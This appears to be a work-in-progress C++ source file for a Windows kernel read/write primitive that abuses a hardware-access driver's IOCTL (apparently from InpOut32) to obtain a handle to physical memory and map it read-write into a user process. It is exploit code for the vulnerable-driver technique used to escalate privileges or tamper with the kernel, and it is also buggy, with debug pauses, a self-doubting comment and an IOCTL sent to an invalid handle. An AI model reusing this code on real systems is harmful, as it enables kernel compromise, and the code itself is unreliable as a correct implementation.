#include "rw_primitive.h"

using myNtMapViewOfSection = NTSTATUS(NTAPI*)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD64 InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect
	);
myNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtMapViewOfSection"));

BOOLEAN MapPhysicalMemory(HANDLE PhysicalMemory, __int64 Address, SIZE_T Length, PDWORD64 VirtualAddress)
{
	NTSTATUS			ntStatus;
	PHYSICAL_ADDRESS	SectionOffset;
	SectionOffset.QuadPart = (ULONGLONG)(Address);
	*VirtualAddress = 0;
	printf("befode the meme");
	system("pause");
	ntStatus = fNtMapViewOfSection // maybe wrong function call?
	(
		PhysicalMemory,
		GetCurrentProcess(),
		(PVOID*)VirtualAddress,
		0L,
		Length,
		&SectionOffset,
		&Length,
		2,
		0,
		PAGE_READWRITE
	);
	printf("ntStatus: %d\n", ntStatus);
	printf("VirtualAddress: %p\n", VirtualAddress);
	printf("ViewBase %p\n", &SectionOffset);
	system("pause");
	if (!NT_SUCCESS(ntStatus)) return false;
	return true;
}

NTSTATUS UnmapPhysicalMemory(HANDLE PhysicalMemory) {
	HANDLE device2 = INVALID_HANDLE_VALUE;
	NTSTATUS status = FALSE;
	DWORD bytesReturned = 0;


	printf("[ ] Calling UnmapPhysicalMemory 0x%p\n", UnmapPhysicalMemory);
	status = DeviceIoControl(device2, IOCTL_UnmapPhysicalMemory, PhysicalMemory,
		sizeof(PhysicalMemory), NULL, 0, &bytesReturned, (LPOVERLAPPED)NULL);
	if (status == FALSE) {
		fprintf(stderr, "[!] UnmapPhysicalMemory failed with %X\n", status);
		return EXIT_FAILURE;
		//https://github.com/ellysh/InpOut32/blob/master/driver/hwinterfacedrv.c
	}
	printf("[*] UnmapPhysicalMemory 0x%X called successfully\n", IOCTL_UnmapPhysicalMemory);
	printf("[*] Buffer from the kernel land: %02X. Received buffer size: %d\n", bytesReturned, bytesReturned);

	return status;
}

HANDLE GetDevicePhysicalMemoryHandle(LPCWSTR driverName) {
	HANDLE device = INVALID_HANDLE_VALUE;
	NTSTATUS status = FALSE;
	DWORD bytesReturned = 0;
	HANDLE hPhysicalMemory = { 0 };


	device = CreateFileW(driverName, GENERIC_ALL, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);

	if (device == INVALID_HANDLE_VALUE)
	{
		fprintf(stderr, "> Could not open device: 0x%X\n", GetLastError());
		CloseHandle(device);
		return NULL;
	}

	printf("[ ] Calling IOCTL_MapPhysicalMemoryToLinearSpace 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
	status = DeviceIoControl(device,
		IOCTL_MapPhysicalMemoryToLinearSpace,
		&hPhysicalMemory,
		sizeof(hPhysicalMemory),
		&hPhysicalMemory,
		sizeof(hPhysicalMemory),
		&bytesReturned,
		(LPOVERLAPPED)NULL);

	if (status == FALSE) {
		fprintf(stderr, "[!] IOCTL_MapPhysicalMemoryToLinearSpace failed with %X\n", status);
		CloseHandle(device);
		return nullptr;
	}


	printf("[*] IOCTL_MapPhysicalMemoryToLinearSpace 0x%X called successfully\n", IOCTL_MapPhysicalMemoryToLinearSpace);
	printf("[*] Buffer from the kernel land: %p", hPhysicalMemory);
	CloseHandle(device);

	return hPhysicalMemory;
}